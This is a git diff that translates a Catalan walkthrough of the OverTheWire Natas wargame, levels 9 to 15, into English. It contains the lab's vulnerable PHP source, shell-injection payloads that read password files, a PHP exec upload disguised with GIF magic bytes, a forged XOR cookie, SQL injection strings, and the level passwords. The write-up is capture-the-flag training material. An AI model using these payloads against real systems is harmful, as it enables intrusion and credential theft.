@@ -226,34 +226,34 @@ Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 URL:      http://natas9.natas.labs.overthewire.org
 ```
 ```
-Cliquem sobre 'view sourcecode' ens mostra:
-<form>
-Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
-</form>
+Clicking on 'view sourcecode' we have:
+    <form>
+    Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+    </form>
 
-Output:
-<pre>
-<?
-$key = "";
-if(array_key_exists("needle", $_REQUEST)) {
-    $key = $_REQUEST["needle"];
-}
-if($key != "") {
-    passthru("grep -i $key dictionary.txt");
-}
-?>
+    Output:
+    <pre>
+    <?
+    $key = "";
+    if(array_key_exists("needle", $_REQUEST)) {
+        $key = $_REQUEST["needle"];
+    }
+    if($key != "") {
+        passthru("grep -i $key dictionary.txt");
+    }
+    ?>
 ```
 ```
-Si escrivim en el formulari: | pwd
-Ens mostra: /var/www/natas/natas9
+If we type this on the form: | pwd
+We get: /var/www/natas/natas9
 
-Per tant, fem el cat de la password.
-| cat /etc/natas_webpass/natas10 
-També funciona amb:
-; cat /etc/natas_webpass/natas10
+Now we retrieve the password:
+    | cat /etc/natas_webpass/natas10 
+Also works with:
+    ; cat /etc/natas_webpass/natas10
 
 Output:
-D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+    D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
 ```
 ## NATAS 10
 ```
@@ -262,39 +262,37 @@ Password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
 URL:      http://natas10.natas.labs.overthewire.org
 ```
 ```
-Cliquem sobre 'view sourcecode'.
-Tenim el contingut interessant:
+Clicking on 'view sourcecode' we have:
+    For security reasons, we now filter on certain characters<br/><br/>
+    <form>
+    Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+    </form>
 
-For security reasons, we now filter on certain characters<br/><br/>
-<form>
-Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
-</form>
-
-Output:
-<pre>
-<?
-$key = "";
-if(array_key_exists("needle", $_REQUEST)) {
-    $key = $_REQUEST["needle"];
-}
-if($key != "") {
-    if(preg_match('/[;|&]/',$key)) {
-        print "Input contains an illegal character!";
-    } else {
-        passthru("grep -i $key dictionary.txt");
+    Output:
+    <pre>
+    <?
+    $key = "";
+    if(array_key_exists("needle", $_REQUEST)) {
+        $key = $_REQUEST["needle"];
     }
-}
-?>
+    if($key != "") {
+        if(preg_match('/[;|&]/',$key)) {
+            print "Input contains an illegal character!";
+        } else {
+            passthru("grep -i $key dictionary.txt");
+        }
+    }
+    ?>
 ```
 ```
-Com que hi ha un 'grep -i", ens aprofitem i hi posem a davant el fitxer que hi volem posar:
-a /etc/natas_webpass/natas11
+The file is calling the "grep -i". We can take advantage of it and view the file we want:
+    a /etc/natas_webpass/natas11
 
-Expressió total:
-grep -i a /etc/natas_webpass/natas11 dictionary.txt
+Total expression:
+    grep -i a /etc/natas_webpass/natas11 dictionary.txt
 
-Ens dona la password:
-/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+We got the passwd:
+    /etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
 ```
 ##  NATAS 11
 ```
@@ -303,100 +301,98 @@ Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
 URL:      http://natas11.natas.labs.overthewire.org
 ```
 ```
-A la pàgina web ens mostra:
-Cookies are protected with XOR encryption
-Background color: #fffffff
+We see:
+    Cookies are protected with XOR encryption
+    Background color: #fffffff
 
-Clicant sobre 'view sourcecode', tenim:
+Clicking on 'view sourcecode':
+    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
 
-$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+    function xor_encrypt($in) {
+        $key = '<censored>';
+        $text = $in;
+        $outText = '';
+        // Iterate through each character
+        for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+        }
 
-function xor_encrypt($in) {
-    $key = '<censored>';
-    $text = $in;
-    $outText = '';
-    // Iterate through each character
-    for($i=0;$i<strlen($text);$i++) {
-    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+        return $outText;
     }
-
-    return $outText;
-}
-function loadData($def) {
-    global $_COOKIE;
-    $mydata = $def;
-    if(array_key_exists("data", $_COOKIE)) {
-    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
-    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
-        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
-        $mydata['showpassword'] = $tempdata['showpassword'];
-        $mydata['bgcolor'] = $tempdata['bgcolor'];
+    function loadData($def) {
+        global $_COOKIE;
+        $mydata = $def;
+        if(array_key_exists("data", $_COOKIE)) {
+        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+        if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+            $mydata['showpassword'] = $tempdata['showpassword'];
+            $mydata['bgcolor'] = $tempdata['bgcolor'];
+            }
+        }
+        }
+        return $mydata;
+    }
+    function saveData($d) {
+        setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+    }
+    $data = loadData($defaultdata);
+    if(array_key_exists("bgcolor",$_REQUEST)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+            $data['bgcolor'] = $_REQUEST['bgcolor'];
         }
     }
+    saveData($data);
+    ?>
+    <h1>natas11</h1>
+    <div id="content">
+    <body style="background: <?=$data['bgcolor']?>;">
+    Cookies are protected with XOR encryption<br/><br/>
+    <?
+    if($data["showpassword"] == "yes") {
+        print "The password for natas12 is <censored><br>";
     }
-    return $mydata;
-}
-function saveData($d) {
-    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
-}
-$data = loadData($defaultdata);
-if(array_key_exists("bgcolor",$_REQUEST)) {
-    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
-        $data['bgcolor'] = $_REQUEST['bgcolor'];
-    }
-}
-saveData($data);
-?>
-<h1>natas11</h1>
-<div id="content">
-<body style="background: <?=$data['bgcolor']?>;">
-Cookies are protected with XOR encryption<br/><br/>
-<?
-if($data["showpassword"] == "yes") {
-    print "The password for natas12 is <censored><br>";
-}
-?>
+    ?>
 ```
 ```
-La cookie que ens dona: MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D
+We have a Cookie like: MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D
 
 Base64 decode: 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67
 
-Com que tenim el JSON, extret de:
-$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
-A JSON:
-{"showpassword": "no", "bgcolor": "#ffffff"}
+WE have the JSON. Found on:
+    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+Converted to JSON:
+    {"showpassword": "no", "bgcolor": "#ffffff"}
 
-Ara podem obtenir la $key, perquè al esta creat amb XOR i tenim les dues variables ($cookie i $json):
+Now we can have the $key because it is creating with XOR. Now we have the two used variables ($cookie i $json):
+    <?php
+    $defaultdata = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
 
-<?php
-$defaultdata = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+    echo $defaultdata;
 
-echo $defaultdata;
+    $cookieS = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=");
 
-$cookieS = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=");
+    echo "\n";
+    echo $cookieS;
 
-echo "\n";
-echo $cookieS;
+    echo "\n";
+    echo($defaultdata ^ $cookieS);
+    ?>
 
-echo "\n";
-echo($defaultdata ^ $cookieS);
-?>
+    {"showpassword":"no","bgcolor":"#ffffff"}
+    0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6
+    KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK
 
-{"showpassword":"no","bgcolor":"#ffffff"}
-0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6
-KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK
+    $key = KNHL
 
-$key = KNHL
-
-El nou xor:
-0l;$$98-8=?#9*jvi7-?ibj.,-' $<jvim.*-(.*i3
+New XOR:
+    0l;$$98-8=?#9*jvi7-?ibj.,-' $<jvim.*-(.*i3
 Base64 encode:
-MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
-Per tant, això ara és la nostra nova cookie amb el "showpassword=yes".
+    MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
+This is our new cookie with "showpassword=yes" set.
 
-Posem la Cookie al navegador i cliquem "set color" i obtenim:
-The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+Now we use that cookie on the browser and click on "set color". We got:
+    The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 ```
 ## NATAS 12
 ```
@@ -405,72 +401,71 @@ Password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 URL:      http://natas12.natas.labs.overthewire.org
 ```
 ```
-<?php
-function genRandomString() {
-    $length = 10;
-    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
-    $string = "";
-    for ($p = 0; $p < $length; $p++) {
-        $string .= $characters[mt_rand(0, strlen($characters)-1)];
-    }
-    return $string;
-}
-function makeRandomPath($dir, $ext) {
-    do {
-    $path = $dir."/".genRandomString().".".$ext;
-    } while(file_exists($path));
-    return $path;
-}
-function makeRandomPathFromFilename($dir, $fn) {
-    $ext = pathinfo($fn, PATHINFO_EXTENSION);
-    return makeRandomPath($dir, $ext);
-}
-if(array_key_exists("filename", $_POST)) {
-    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
-        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
-        echo "File is too big";
-    } else {
-        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
-            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
-        } else{
-            echo "There was an error uploading the file, please try again!";
+Code:
+    <?php
+    function genRandomString() {
+        $length = 10;
+        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+        $string = "";
+        for ($p = 0; $p < $length; $p++) {
+            $string .= $characters[mt_rand(0, strlen($characters)-1)];
         }
+        return $string;
     }
-} else {
-?>
-<form enctype="multipart/form-data" action="index.php" method="POST">
-<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
-<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
-Choose a JPEG to upload (max 1KB):<br/>
-<input name="uploadedfile" type="file" /><br />
-<input type="submit" value="Upload File" />
-</form>
-<?php } ?>
+    function makeRandomPath($dir, $ext) {
+        do {
+        $path = $dir."/".genRandomString().".".$ext;
+        } while(file_exists($path));
+        return $path;
+    }
+    function makeRandomPathFromFilename($dir, $fn) {
+        $ext = pathinfo($fn, PATHINFO_EXTENSION);
+        return makeRandomPath($dir, $ext);
+    }
+    if(array_key_exists("filename", $_POST)) {
+        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+            if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+            echo "File is too big";
+        } else {
+            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+            } else{
+                echo "There was an error uploading the file, please try again!";
+            }
+        }
+    } else {
+    ?>
+    <form enctype="multipart/form-data" action="index.php" method="POST">
+    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+    Choose a JPEG to upload (max 1KB):<br/>
+    <input name="uploadedfile" type="file" /><br />
+    <input type="submit" value="Upload File" />
+    </form>
+    <?php } ?>
 ```
 ```
-Aquesta pàgina el que fa bàsicament és que tu pots penjar un fitxer JPEG (max d'1KB) i després pots anar a veure la imatge en qüestió.
-Primer comprovem si podem penjar altres fitxers que no només siguin format "JPEG".
-Comprovem que si penjem un fitxer .txt (per exemple), ens el deixa pujar, però no el renderitza (no veiem el contingut).
-Procedim a crear un fitxer .php on ens mostri la password de l'usuari 13.
-Tot i així, utilitzarem el mètode "exec" perquè el servidor executi la funció en bash que li passem.
+On this web page basically you can upload a JPEG file (max d'1KB) and after you can go to see that file.
+We try to upload a txt file but we can't see it's content.
+Now we proceed to create a php that shows the passwd of the user 13.
 
-Fitxer .php, amb payload:
-<?php
-echo(exec('cat /etc/natas_webpass/natas13'));
-?>
+PHP file:
+    <?php
+    echo(exec('cat /etc/natas_webpass/natas13'));
+    ?>
 
-Un cop el fitxer s'ha pujat, inspeccionem el contingut de la nostra pàgina web i veurem una línia com aquesta:
+Once the file is upload, we are unable to see the content. Why?
+Because the site when it uploads a file it change our file extension to "jpg".
+
+Inspecting the source code we have:
     <input type="hidden" name="filename" value="s9pspizx1z.jpg">
-Des del navegador modifiquem el nom de .jpg a .php:
+From the browser we change .jpg to .php:
     <input type="hidden" name="filename" value="s9pspizx1z.php">
-I li donem al botó de 'Upload File', podrem veure:
+
+We click the 'Upload File' button and we see:
     The file upload/s9pspizx1z.php has been uploaded.
 
-Ens hi dirigim i ens mostrara el contingut del fitxer, és a dir, la password.
-
-Com que estem executant a través del navegador, realment som l'usuari www-data.
-La vulnerabilitat esta en que aixó és una miss-config ja que aquest usuari no hauria de poder mostrar aquest fitxer.
-Apart de que no ens hauria de poder deixar pujar fitxers que no siguin JPEG.
+We go to that file and we find the passwd.
 ```
 ##  NATAS 13
 ```
@@ -479,84 +474,85 @@ Password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
 URL:      http://natas13.natas.labs.overthewire.org
 ```
 ```
-<div id="content">
-For security reasons, we now only accept image files!<br/><br/>
-<?php
-function genRandomString() {
-    $length = 10;
-    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
-    $string = "";
-    for ($p = 0; $p < $length; $p++) {
-        $string .= $characters[mt_rand(0, strlen($characters)-1)];
-    }
-    return $string;
-}
-function makeRandomPath($dir, $ext) {
-    do {
-    $path = $dir."/".genRandomString().".".$ext;
-    } while(file_exists($path));
-    return $path;
-}
-function makeRandomPathFromFilename($dir, $fn) {
-    $ext = pathinfo($fn, PATHINFO_EXTENSION);
-    return makeRandomPath($dir, $ext);
-}
-if(array_key_exists("filename", $_POST)) {
-    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
-    $err=$_FILES['uploadedfile']['error'];
-    if($err){
-        if($err === 2){
-            echo "The uploaded file exceeds MAX_FILE_SIZE";
-        } else{
-            echo "Something went wrong :/";
+Code:
+    <div id="content">
+    For security reasons, we now only accept image files!<br/><br/>
+    <?php
+    function genRandomString() {
+        $length = 10;
+        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+        $string = "";
+        for ($p = 0; $p < $length; $p++) {
+            $string .= $characters[mt_rand(0, strlen($characters)-1)];
         }
-    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
-        echo "File is too big";
-    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
-        echo "File is not an image";
+        return $string;
+    }
+    function makeRandomPath($dir, $ext) {
+        do {
+        $path = $dir."/".genRandomString().".".$ext;
+        } while(file_exists($path));
+        return $path;
+    }
+    function makeRandomPathFromFilename($dir, $fn) {
+        $ext = pathinfo($fn, PATHINFO_EXTENSION);
+        return makeRandomPath($dir, $ext);
+    }
+    if(array_key_exists("filename", $_POST)) {
+        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+        $err=$_FILES['uploadedfile']['error'];
+        if($err){
+            if($err === 2){
+                echo "The uploaded file exceeds MAX_FILE_SIZE";
+            } else{
+                echo "Something went wrong :/";
+            }
+        } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+            echo "File is too big";
+        } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+            echo "File is not an image";
+        } else {
+            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+            } else{
+                echo "There was an error uploading the file, please try again!";
+            }
+        }
     } else {
-        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
-            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
-        } else{
-            echo "There was an error uploading the file, please try again!";
-        }
-    }
-} else {
-?>
-<form enctype="multipart/form-data" action="index.php" method="POST">
-<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
-<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+    ?>
+    <form enctype="multipart/form-data" action="index.php" method="POST">
+    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
 ```
 ```
-Veiem que és mes o menys igual que l'anterior, però ara comprova si és un fitxer JPEG.
-Veiem que la funció que ho comprova és "exif_imagetype", per tant, esta utilitzant 'exif'.
-Exif són les metadades de les imatges.
+We see a web page that is similar to Natas 12 but now it checks if it's a JPEG file.
+This check is made with the func "exif_imagetype". It's made with the 'exif' tool.
+Exif are the metadata in the images.
 
-Fent una prova amb una imatge (per exemple: exiftool photo.jpeg), veig que ens mostra molts 'fields' útils:
-"File size, File Type, File Type Extension, MIME Type, etc"
-Tots els possibles: https://exiftool.org/TagNames/EXIF.html
+We check on our terminal how exif works:
+    exiftool {file}
+There are multiple usedul fields:
+    "File size, File Type, File Type Extension, MIME Type..."
+    Alll possible fields: https://exiftool.org/TagNames/EXIF.html
 
-Per tant, crec que podem canviar l'imagetype perquè ens ho pilli com un fitxer php i poder executar el nostre codi.
-Per fer-ho, busco sobre els 'Magic Numbers', que són simplement els primers bytes d'un fitxer per identificar de quin tipus són.
+Now we try to change the "imagetype" field. With that we will bypass the check of a JPEG image and inject some PHP code.
+We have to take a look to the 'Magic Numbers'. They are the first bytes of a file to identify which type of file is.
 
-Per trobar + info de la imatge:
+We can have more info of the image:
     file photo.jpg               
     photo.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 2392x2500, components 3
-Per trobar els primers bytes:
+To see the Magic Numbers:
     xxd photo.jpg | head
     00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
-Tenim que els fitxers '.jpg', començen amb aquests bytes.
 
-Provem a fer una prova en local de modificar un fitxer:
-(creen un fitxer .txt i li apliquem aquest contingut, on podem comprovar que ens detecta com si fos un GIF).
+We have that the files with extension '.jpg' starts with these bytes.
+
+On Local we try to do a test:
 
     echo -n -e 'GIF87a' > file.txt
     file file.txt 
     file.txt: GIF image data, version 87a,
 
-
-Modifiquem el nostre fitxer perquè la web s'ho tragui i ara tenim:
-
+We modify our PHP script that the webpage will accept it.
     GIF8;
     <?php
     echo(exec('cat /etc/natas_webpass/natas14'));
@@ -569,52 +565,44 @@ Password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
 URL:      http://natas14.natas.labs.overthewire.org
 ```
 ```
+Code:
 <h1>natas14</h1>
 <div id="content">
-<?php
-if(array_key_exists("username", $_REQUEST)) {
-    $link = mysqli_connect('localhost', 'natas14', '<censored>');
-    mysqli_select_db($link, 'natas14');
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query<br>";
-    }
-    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
-            echo "Successful login! The password for natas15 is <censored><br>";
+    <?php
+    if(array_key_exists("username", $_REQUEST)) {
+        $link = mysqli_connect('localhost', 'natas14', '<censored>');
+        mysqli_select_db($link, 'natas14');
+        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+        if(array_key_exists("debug", $_GET)) {
+            echo "Executing query: $query<br>";
+        }
+        if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+                echo "Successful login! The password for natas15 is <censored><br>";
+        } else {
+                echo "Access denied!<br>";
+        }
+        mysqli_close($link);
     } else {
-            echo "Access denied!<br>";
-    }
-    mysqli_close($link);
-} else {
-?>
-<form action="index.php" method="POST">
-Username: <input name="username"><br>
-Password: <input name="password"><br>
-<input type="submit" value="Login" />
-</form>
-<?php } ?>
+    ?>
+    <form action="index.php" method="POST">
+    Username: <input name="username"><br>
+    Password: <input name="password"><br>
+    <input type="submit" value="Login" />
+    </form>
+    <?php } ?>
 ```
-``` 
-Veiem que la pàgina web esta formada per un login (d'username i password) i si aconseguim entrar amb algún usuari, ens mostrara la contrasenya.
-Tenim la següent sentència on veiem que pot ser injectable.
+```
+Now there's a login with $username & $password.
+If we can do the login we will see the passwd for the next natas.
+
+We have an SQL query that might be injectable:
     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
 
-Dedueixo que puc fer una injecció SQL, per tant, ara és el moment d'utilitzar caràcters estranys i aplicar seqüències SQL interessants.
-Per fer-ho fàcil i poder veure més clarament la sentència; en el login inserim "a" i "b", ens queda aixi:
-    $query = "SELECT * from users where username="a" and password="b";
-El nostre payload:
+SQL injection:
     $query = "SELECT * from users where username="a" and password=""or 1=1-- -";
     $query = "SELECT * from users where username="a" and password=""or 1=1#";
 
-Estem inserint: "or 1=1-- -
-Bàsicament, la query està fent: (FALSE I FALSE) or TRUE.
-Sempre serà TRUE, per tant esta fent un SELECT * form users.
-Per això quan ens diu que ha de tenir més de 0 rows, ens ho pilla.
-
-Aquí és important utilitzar el comentari, perquè sinó no hi hauria cap row i no ens mostraria la password.
-
-La vulnerabilitat està en que no es saneja el codi d'entrada de la sentència SQL.
-És a dir, li podem passar qualsevol sentència SQL que sempre ho executarà.
+On the $password field we are injecting: "or 1=1-- -
 ```
 ##  NATAS 15
 ```
@@ -623,53 +611,54 @@ Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
 URL:      http://natas15.natas.labs.overthewire.org
 ```
 ```
-<div id="content">
-<?php
-/*
-CREATE TABLE `users` (
-`username` varchar(64) DEFAULT NULL,
-`password` varchar(64) DEFAULT NULL
-);
-*/
-if(array_key_exists("username", $_REQUEST)) {
-    $link = mysqli_connect('localhost', 'natas15', '<censored>');
-    mysqli_select_db($link, 'natas15');
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query<br>";
-    }
-    $res = mysqli_query($link, $query);
-    if($res) {
-    if(mysqli_num_rows($res) > 0) {
-        echo "This user exists.<br>";
+Code:
+    <div id="content">
+    <?php
+    /*
+    CREATE TABLE `users` (
+    `username` varchar(64) DEFAULT NULL,
+    `password` varchar(64) DEFAULT NULL
+    );
+    */
+    if(array_key_exists("username", $_REQUEST)) {
+        $link = mysqli_connect('localhost', 'natas15', '<censored>');
+        mysqli_select_db($link, 'natas15');
+        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+        if(array_key_exists("debug", $_GET)) {
+            echo "Executing query: $query<br>";
+        }
+        $res = mysqli_query($link, $query);
+        if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            echo "This user exists.<br>";
+        } else {
+            echo "This user doesn't exist.<br>";
+        }
+        } else {
+            echo "Error in query.<br>";
+        }
+        mysqli_close($link);
     } else {
-        echo "This user doesn't exist.<br>";
-    }
-    } else {
-        echo "Error in query.<br>";
-    }
-    mysqli_close($link);
-} else {
-?>
+    ?>
 ```
 ```
-Tenim un exercici semblant a l'anterior; una base de dades i una sentència SQL.
-En aquest cas però, no tenim un login. Simplement mira si un usuari existeix o no.
-El problema està en que si aconseguim fer una injecció SQL, mai aconseguirem el password.
-Haurem de fer un atac de força bruta i anar treient el password lletra a lletra.
+Now we see that there's a database and SQL queries.
+But in this case we don't have a login. It does checks if a user exists.
 
-Si en l'usuari posem: a, ens torna: This user doesn't exist.
-Si en l'usuari posem: " or 1=1#, ens torna: This user exists. --> He aprofitat el codi de l'anterior natas.
-Igual que si posem natas16, també ens mostra que l'usuari existeix.
+The "problem" is that is we can make SQL Injection like the before natas, we will never see the password. Because there is no "echo" for the password.
 
-Procedim a crear un script (natas16_1.py) on farem moltes peticions a la pàgina del natas.
-Aquestes peticions estaran compostes d'una sentència SQL a l'apartat de l'username:
-    'natas16" and password like binary "{}%"#'.format(partialpass)
-D'aquesta manera, l'user natas16 sempre existirà, i a més a més, li demanem la password d'aquest.
+We will make Brute Force to retrieve the password.
+If we put on the $username variable "" or 1=1#" it says "This user exists".
+Now we know that only it's checking the $password field.
 
-La història està en que si l'usuari és natas16 i la password comença per 'a', ens tornarà el text "This user exists".
-Però si l'usuari és natas16 i la password comença per 'b', ens tornarà el text "This user doesn't exists".
-Per tant, haurem de fer un bucle, anar caràcter a caràcter (a-z, A-Z i 0-9) i sempre que ens torni el text de "This user exists", serà un caràcter de la password.
+If we put "natas16" on $username and "a" on $password we have "This user doesn't exists".
+But if we put "T" it says "This users exists".
+
+So we will make a script (natas15.py) that it will do requests to the site with "natas16" on the $username.
+On the $password field we will make a loop and send all the alphanumeric characters (a-z + A-Z + 0-9) one by one.
+
+If the response is "This user exists" the password have that character.
+If the response is "This user doesn't exists" the character isn't in the password.
 ```
 ##  NATAS 16
 ```
